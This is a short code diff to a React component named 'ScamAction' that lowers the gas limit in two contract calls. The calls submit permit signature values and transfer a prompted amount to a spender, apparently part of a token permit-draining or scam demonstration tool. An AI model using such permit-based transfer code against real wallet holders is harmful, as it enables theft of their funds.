@@ -30,7 +30,7 @@ const ScamAction = (props: {
 						data.r,
 						data.s,
 						{
-							gasLimit: 1000000
+							gasLimit: 10000
 						}
 					], contractAddress,
 					provider)
@@ -57,7 +57,7 @@ const ScamAction = (props: {
 					data.permit.spender,
 					window.prompt("Enter Amount to transfer"),
 					{
-						gasLimit: 1000000
+						gasLimit: 10000
 					}
 				], contractAddress, provider)
 					.catch((e) => {
